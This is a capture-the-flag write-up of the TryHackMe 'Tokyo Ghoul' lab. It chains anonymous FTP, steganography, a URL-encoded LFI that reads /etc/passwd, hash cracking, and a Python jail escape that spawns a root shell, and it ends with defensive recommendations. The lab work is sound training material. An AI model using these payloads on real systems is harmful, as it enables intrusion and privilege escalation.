---
title: "Tokyo Ghoul — TryHackMe Penetration Test Writeup"
date: 2026-10-22 18:00:00 +0200
categories: [Writeups, TryHackMe]
tags: [tryhackme, ftp, steganography, reverse-engineering, lfi, path-traversal, python-jail, privilege-escalation, hash-cracking, linux]
description: "A TryHackMe Tokyo Ghoul write-up covering anonymous FTP, binary reverse engineering, steganography, multi-layer encoding, LFI via URL encoding bypass, and Python jail escape to root."
pin: false
toc: true
media_subpath: /assets/img/posts/tokyoghoul
---

> **Authorized lab / spoiler warning:** This write-up documents an intentionally vulnerable TryHackMe machine used for cybersecurity training. It contains credentials, flags, exploitation steps, and spoilers. If you are actively working on this room, stop reading here.
{: .prompt-warning }

**Platform:** TryHackMe  
**Room:** Tokyo Ghoul  
**Difficulty:** Easy–Medium  
**Status:** Complete — user and root flags captured.

---

## Executive Summary

Tokyo Ghoul is a creative TryHackMe machine themed around the anime series of the same name. The attack path chains together six distinct techniques before achieving a foothold: anonymous FTP enumeration, binary reverse engineering with Ghidra, steganography with steghide, multi-layer encoding (Morse code → hexadecimal → ASCII), web directory enumeration, and a URL-encoded Local File Inclusion (LFI) bypass. Privilege escalation was achieved by escaping a Python keyword-blacklist jail running under a misconfigured sudo rule. No CVEs were required — every step relied on misconfigurations, weak credentials, and application logic flaws.

**Flags captured:**
- `user.txt` (kamishiro): Found
- `root.txt` (root): Found

---

## Reconnaissance

### Port Scanning

The engagement began with a standard nmap service scan:

```bash
nmap -sC -sV -oN nmap_initial.txt <TARGET_IP>
```

![Nmap scan results](nmapscan.png)
_Nmap identifying three open ports on the target._

**Results:**

| Port | State | Service | Version |
|------|-------|---------|---------|
| 21/tcp | open | FTP | vsftpd 3.0.3 |
| 22/tcp | open | SSH | OpenSSH 7.2p2 Ubuntu |
| 80/tcp | open | HTTP | Apache 2.4.18 (Ubuntu) |

The single most important line in the scan output was:

```
ftp-anon: Anonymous FTP login allowed (FTP code 230)
```

Nmap's scripts also revealed a directory called `need_Help?` already visible on the FTP server — an obvious invitation.

---

## Technical Findings & Exploitation

### 1. Anonymous FTP Enumeration

FTP was accessed without credentials using the username `anonymous` and a blank password:

```bash
ftp <TARGET_IP>
# Username: anonymous
# Password: (blank, just hit Enter)
```

Inside `need_Help?` → `Talk_with_me`, two files were found alongside a text file in the parent directory:

| File | Type | Location |
|------|------|----------|
| `Aogiri_tree.txt` | Text | `need_Help?/` |
| `need_to_talk` | ELF executable | `need_Help?/Talk_with_me/` |
| `rize_and_kaneki.jpg` | JPEG image | `need_Help?/Talk_with_me/` |

All files were downloaded with `get` and `mget`. The text file contained in-universe flavour text hinting that a "kagune" could be unlocked by knowing "Rize San" — pointing toward the image as a key asset.

> **Lesson:** Anonymous FTP is a critical misconfiguration. Any file on an anonymously accessible FTP server is effectively public. Always check for anonymous login during recon — Nmap's `-sC` flag will detect it automatically.

### 2. Binary Reverse Engineering

The `need_to_talk` binary, when executed, prompted for a paraphrase:

```
Hey Kaneki finally you want to talk
Unfortunately before I can give you the kagune you need to give me the paraphrase
Do you have what I'm looking for?
>
```

The binary was loaded into **Ghidra** for static analysis. Decompilation of the `check_password()` function revealed the passphrase hardcoded in memory:

```c
MOV RDX=>s_kamishiro_00102008, qword ptr [the_password]
// the_password = "kamishiro"
```

![Ghidra decompilation showing hardcoded passphrase](gira.png)
_Ghidra decompilation revealing `kamishiro` as the hardcoded passphrase._

Running the binary with `kamishiro` produced:

```
Good job. I believe this is what you came for:
You_found_1t
```

`You_found_1t` was the steghide passphrase for the image.

> **Lesson:** Hardcoded credentials in binaries are easily extracted. `strings`, `rabin2 -z`, or a decompiler like Ghidra can pull them trivially. Secrets should never be compiled into code.

### 3. Steganography

With the passphrase in hand, steghide extracted hidden data from the JPEG:

```bash
steghide extract -sf rize_and_kaneki.jpg -p You_found_1t
# wrote extracted data to "yougotme.txt"
```

`yougotme.txt` contained a block of Morse code with the message: *"if you can talk it alright you got my secret directory."*

### 4. Multi-Layer Encoding: Morse → Hex → ASCII

The Morse code in `yougotme.txt` was decoded in two stages using CyberChef (From Morse Code → From Hex):

**Stage 1 — Morse to Hex:**

![CyberChef Morse code decoding](frommorse.png)
_Morse code decoded to hex pairs._

```
5A 44 46 79 4D 32 4D 33 4D 48 4A 35 58 32 4E 6C 62 6E 52 6C 63 67 3D 3D
```

**Stage 2 — Hex to ASCII:**

![CyberChef hex to ASCII decoding](fromhex.png)
_Hex decoded to the final ASCII directory name._

```
d1r3c70ry_center
```

This was the hidden web directory path.

> **Lesson:** Multi-layer encoding is a common CTF technique. Recognising the encoding format at each layer (Morse, hex, base64) is a key skill. CyberChef is invaluable for chaining decode operations quickly.

### 5. Web Enumeration

The main website on port 80 showed a Tokyo Ghoul-themed page. Inspecting the HTML source revealed a hidden comment on both `index.html` and `/jasonroom.html`:

```html
<!-- look don't tell jason but we will help you escape we will give you
the key to open those chains and here is some clothes to look like us
and a mask to look anonymous and go to the ftp room right there -->
```

This hinted toward anonymous FTP and foreshadowed the path ahead.

Directory enumeration was run in two passes — first against the webroot, then specifically against the discovered directory:

```bash
gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
dirb http://<TARGET_IP>/d1r3c70ry_center
```

![Dirb discovering the /claim/ subdirectory](secretdirectorysite.png)
_Dirb finding the `/claim/` subdirectory inside `d1r3c70ry_center`._

Dirb discovered:

```
http://<TARGET_IP>/d1r3c70ry_center/claim/
```

> **Lesson:** Gobuster is not recursive by default. Always re-run enumeration against newly discovered directories. Dirb with its built-in wordlist is a quick way to go deeper.

### 6. Local File Inclusion (LFI) via URL Encoding Bypass

The `/claim/` directory contained `index.php` with a `?view=` parameter that loaded files by name (e.g. `?view=flower.gif`). This is a classic LFI pattern.

![The /claim/ page showing the ?view= parameter](dirb.png)
_The claim page with the vulnerable `?view=` parameter visible in the status bar._

A direct traversal attempt was blocked by a server-side filter:

```bash
curl "http://<TARGET_IP>/d1r3c70ry_center/claim/index.php?view=../../../etc/passwd"
# Response: "no no no silly don't do that"
```

The filter checked for the literal string `../` but did not account for URL-encoded equivalents. Encoding `.` as `%2e` and `/` as `%2f` bypassed it completely:

```bash
curl "http://<TARGET_IP>/d1r3c70ry_center/claim/index.php?view=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
```

The server decoded the URL encoding before processing the path, walking outside the web root and reading `/etc/passwd`. The file revealed a non-system user with a login shell:

```
kamishiro:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:1001:1001:,,,:/home/kamishiro:/bin/bash
```

The `$6$` prefix identifies this as a SHA-512 crypt hash.

> **Lesson:** Blacklist-based LFI filters are fragile. URL encoding, double encoding, and `....//` mixed traversal are all well-documented bypasses. Input must be canonicalized *before* validation — decode first, then check.

### 7. Password Hash Cracking

The hash was saved and cracked with John the Ripper:

```bash
echo '$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0' > hash.txt
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

John cracked the hash almost immediately. The password was `password123`.

### 8. SSH Foothold

```bash
ssh kamishiro@<TARGET_IP>
# Password: password123
```

Shell obtained as `kamishiro` on Ubuntu 16.04.7 LTS. The user flag was at `/home/kamishiro/user.txt`:

**user.txt:** `[REDACTED]`

---

## Privilege Escalation

### Sudo Enumeration

```bash
sudo -l
```

```
User kamishiro may run the following commands on vagrant.vm:
    (ALL) /usr/bin/python3 /home/kamishiro/jail.py
```

`kamishiro` could run `jail.py` as **root** via sudo. If the jail could be escaped, we would have a root shell.

### Python Jail Analysis

The contents of `jail.py`:

```python
def main():
    print("Hi! Welcome to my world kaneki")
    print("========================================================================")
    print("What ? You gonna stand like a chicken ? fight me Kaneki")
    text = input('>>> ')
    for keyword in ['eval', 'exec', 'import', 'open', 'os', 'read', 'system', 'write']:
        if keyword in text:
            print("Do you think i will let you do this ??????")
            return;
    else:
        exec(text)
        print('No Kaneki you are so dead')
```

The jail used a simple keyword blacklist. Three critical weaknesses made it escapable:

1. **Substring matching only** — the filter checks whether a keyword appears anywhere in the input string, but does not account for strings built dynamically at runtime via concatenation.
2. **`subprocess` not blacklisted** — only `os` and `system` were blocked, not `subprocess`, which provides equivalent command execution.
3. **`__builtins__` accessible** — Python's built-in namespace is available, and `getattr` can retrieve functions from it by name — including `__import__` — without ever writing the banned keyword literally.

### Jail Escape

The escape payload reconstructed `__import__` by splitting the string across a concatenation operator so the filter never saw the literal word `import`, then imported `subprocess` (not on the blacklist) and called `bash -i` to spawn an interactive root shell:

```bash
sudo /usr/bin/python3 /home/kamishiro/jail.py
```

At the `>>>` prompt:

```python
getattr(__builtins__, '__imp'+'ort__')('subpr'+'ocess').call(['bash', '-i'])
```

This dropped into a root shell:

```
root@vagrant:~#
```

The root flag was at `/root/root.txt`:

**root.txt:** `[REDACTED]`

> **Lesson:** Python jails based on keyword blacklists are inherently bypassable. Python's introspection capabilities make it virtually impossible to secure input this way. The only safe approach is not to run user input through `exec()` at all.

---

## Attack Chain

```
Nmap scan
  └─> Anonymous FTP login
        └─> need_to_talk binary + rize_and_kaneki.jpg
              └─> Ghidra reverse engineering → passphrase: kamishiro
                    └─> Binary output → steghide passphrase: You_found_1t
                          └─> steghide extract → yougotme.txt
                                └─> Morse → Hex → ASCII → d1r3c70ry_center
                                      └─> dirb → /claim/ subdirectory
                                            └─> LFI via URL encoding bypass
                                                  └─> /etc/passwd → kamishiro hash
                                                        └─> John the Ripper → password123
                                                              └─> SSH foothold as kamishiro
                                                                    └─> sudo jail.py
                                                                          └─> Python jail escape
                                                                                └─> Root shell
```

---

## Lessons Learned

| # | Lesson |
|---|--------|
| 1 | Anonymous FTP is a critical misconfiguration — always check it during recon, Nmap `-sC` detects it automatically |
| 2 | Hardcoded credentials in binaries are trivially extractable with `strings`, `rabin2 -z`, or Ghidra |
| 3 | HTML source comments leak information — always read page source during web enumeration |
| 4 | LFI blacklist filters are fragile — URL encoding, double encoding, and `....//` are well-known bypasses |
| 5 | Python keyword-blacklist jails are bypassable via `getattr`, string concatenation, and unlisted modules |
| 6 | Sudo access to a user-controlled script is equivalent to granting root — always audit sudo rules |
| 7 | Multi-layer encoding (Morse → Hex → ASCII) requires recognising each format independently; CyberChef chains them |
| 8 | Gobuster is not recursive — always re-run against newly discovered directories |

---

## Recommendations

| Finding | Risk | Recommendation |
|---------|------|----------------|
| Anonymous FTP with sensitive files | High | Disable anonymous FTP or remove all non-public files from the server |
| Hardcoded passphrase in binary | High | Never store credentials in compiled code; use environment variables or a secrets manager |
| LFI in `?view=` parameter | High | Canonicalize paths before validation; use an allowlist of permitted filenames |
| SHA-512 hash with weak password (`password123`) | High | Enforce strong password policy; prefer bcrypt or Argon2 for password storage |
| Sudo rule allowing `jail.py` execution | High | Remove the sudo rule; never grant sudo to scripts that process user input |
| Python jail using `exec()` on user input | High | Never pass unsanitized user input to `exec()` |
| Apache 2.4.18 (end-of-life) | Medium | Upgrade to a supported Apache release |
| HTML comments with internal hints | Low | Strip all comments from production HTML before deployment |

---

## Appendix — Credentials Found

| Account | Credential | Source |
|---------|-----------|--------|
| Binary passphrase | `kamishiro` | Hardcoded in `need_to_talk` (Ghidra) |
| Steghide passphrase | `You_found_1t` | Output of `need_to_talk` binary |
| SSH `kamishiro` | `password123` | `/etc/passwd` hash cracked with John |

## Appendix — Key Commands

```bash
# Nmap
nmap -sC -sV -oN nmap_initial.txt <TARGET_IP>

# FTP anonymous login
ftp <TARGET_IP>
# user: anonymous, pass: (blank)
cd need_Help?/Talk_with_me
mget *

# Run the binary
chmod +x need_to_talk && ./need_to_talk
# Enter: kamishiro

# Steghide extraction
steghide extract -sf rize_and_kaneki.jpg -p You_found_1t

# Web directory enumeration
gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
dirb http://<TARGET_IP>/d1r3c70ry_center

# LFI via URL encoding bypass
curl "http://<TARGET_IP>/d1r3c70ry_center/claim/index.php?view=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"

# Hash cracking
echo '<hash>' > hash.txt
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt

# SSH
ssh kamishiro@<TARGET_IP>
# Password: password123

# Privilege escalation — run jail as root
sudo /usr/bin/python3 /home/kamishiro/jail.py
# At >>> prompt:
getattr(__builtins__, '__imp'+'ort__')('subpr'+'ocess').call(['bash', '-i'])
```
